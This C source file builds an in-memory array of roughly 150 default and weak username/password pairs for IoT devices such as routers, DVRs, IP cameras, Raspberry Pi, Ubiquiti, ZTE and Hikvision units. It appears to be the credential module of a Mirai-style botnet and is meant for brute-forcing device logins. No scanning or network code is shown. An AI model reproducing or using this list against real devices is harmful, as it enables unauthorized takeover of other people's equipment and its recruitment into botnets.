#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "headers/combos.h"

int cindex = 0;
Combo *combos = NULL;

void combo_add(char *username, char *password)
{
    if (combos == NULL)
        combos = calloc(1, sizeof(Combo));
    else
        combos = realloc(combos, (cindex + 2) * sizeof(Combo));

    combos[cindex].username = username;
    combos[cindex].password = password;

    combos[cindex].username_len = strlen(username);
    combos[cindex].password_len = strlen(password);
    cindex++;
}

void combos_init(void)
{
    combo_add("user", "user");
    combo_add("root", "pass");
    combo_add("admin", "admin1234");
    combo_add("password", "password");
    combo_add("system", "OkwKcECs8qJP2Z");
    combo_add("system", "system");
    combo_add("Remark", "");
    combo_add("root", "klv123");
    combo_add("root", "h2014071");
    combo_add("root", "realtek");
    combo_add("root", "1111");
    combo_add("admin", "0000");
    combo_add("pi", "raspberry");
    combo_add("nzbget", "tegbzn6789");
    combo_add("admin", "smcadmin");
    combo_add("admin", "1111");
    combo_add("root", "666666");
    combo_add("root", "password");
    combo_add("root", "1234");
    combo_add("root", "klv123");
    combo_add("root", "Serv4EMC");
    combo_add("bin", "");
    combo_add("Administrator", "admin");
    combo_add("service", "service");
    combo_add("supervisor", "supervisor");
    combo_add("guest", "guest");
    combo_add("guest", "12345");
    combo_add("guest", "12345");
    combo_add("admin1", "password");
    combo_add("administrator", "1234");
    combo_add("666666", "666666");
    combo_add("888888", "888888");
    combo_add("root", "klv1234");
    combo_add("root", "Zte521");
    combo_add("root", "hi3518");
    combo_add("root", "jvbzd");
    combo_add("root", "anko");
    combo_add("root", "zlxx.");
    combo_add("root", "7ujMko0vizxv");
    combo_add("root", "7ujMko0admin");
    combo_add("root", "system");
    combo_add("root", "ikwb");
    combo_add("root", "dreambox");
    combo_add("root", "user");
    combo_add("root", "realtek");
    combo_add("root", "00000000");
    combo_add("admin", "1111111");
    combo_add("admin", "1234");
    combo_add("admin", "12345");
    combo_add("admin", "54321");
    combo_add("admin", "123456");
    combo_add("admin", "7ujMko0admin");
    combo_add("admin", "1234");
    combo_add("admin", "pass");
    combo_add("admin", "meinsm");
    combo_add("tech", "tech");
    combo_add("root", "123456789");
    combo_add("toor", "root");
    combo_add("root", "toor");
    combo_add("root", "");
    combo_add("admin", "");
    combo_add("root", "lmao");
    combo_add("amx", "amx");
    combo_add("root", "xc3511");
    combo_add("xc3511", "root");
    combo_add("root", "root");
    combo_add("admin", "admin");
    combo_add("ubnt", "ubnt");
    combo_add("ubuntu", "ubuntu");
    combo_add("default", "default");
    combo_add("test", "test");
    combo_add("fake", "fake");
    combo_add("root", "admin");
    combo_add("admin", "root");
    combo_add("root", "123");
    combo_add("root", "1234");
    combo_add("root", "123456");
    combo_add("root", "changeme");
    combo_add("admin", "changeme");
    combo_add("guest", "1234");
    combo_add("guest", "12345");
    combo_add("guest", "123456");
    combo_add("admin", "1234");
    combo_add("admin", "12345");
    combo_add("admin", "123456");
    combo_add("hikvision", "hikvision");
    combo_add("ftp", "ftp");
    combo_add("root", "888888");
    combo_add("default", "");
    combo_add("1234", "1234");
    combo_add("root", "admin");
    combo_add("USERNAME", "PASSWORD");
    combo_add("admin", "vizxv");
    combo_add("root", "juantech");
    combo_add("admin", "666666");
    combo_add("default", "pass");
    combo_add("default", "OxhlwSG8");
    combo_add("root", "fivranne");
    combo_add("admin", "guest");
    combo_add("guest", "admin");
    combo_add("root", "klv1234");
    combo_add("root", "7ujMko0root");
    combo_add("admin", "default");
    combo_add("root", "default");
    combo_add("superadmin", "superadmin");
    combo_add("default", "antslq");
    combo_add("default", "admin");
    combo_add("user", "password");
    combo_add("guest", "12345");
    combo_add("admin", "password");
    combo_add("root", "vizxv");
    combo_add("root", "xc3511");
    combo_add("default", "");
    combo_add("User", "admin");
    combo_add("guest", "12345");
    combo_add("admin", "password");
    combo_add("root", "Zte521");
    combo_add("default", "S2fGqNFs");
    combo_add("sysadm", "sysadm");
    combo_add("support", "support");
    combo_add("root", "password");
    combo_add("adm", "");
    combo_add("bin", "");
    combo_add("daemon", "");
    combo_add("root", "cat1029");
    combo_add("admin", "cat1029");
    combo_add("ubnt", "1234");
    combo_add("ubnt", "password");
    combo_add("ubuntu", "ububtu");
    combo_add("ucspe", "ucspe");
    combo_add("root", "pentium");
    combo_add("root", "permit");
    combo_add("root", "pgsql");
    combo_add("root", "pgsql123");
    combo_add("root", "phoenix");
    combo_add("root", "photo");
    combo_add("root", "photos");
    combo_add("root", "pi");
    combo_add("root", "pinkpanter");
    combo_add("root", "pixmet2003");
    combo_add("root", "xc3511");
    combo_add("root", "admin");
    combo_add("root", "xmhdipc");
    combo_add("root", "juantech");
    combo_add("root", "123456");
    combo_add("root", "54321");
    combo_add("admin", "password");
    combo_add("root", "12345");

}
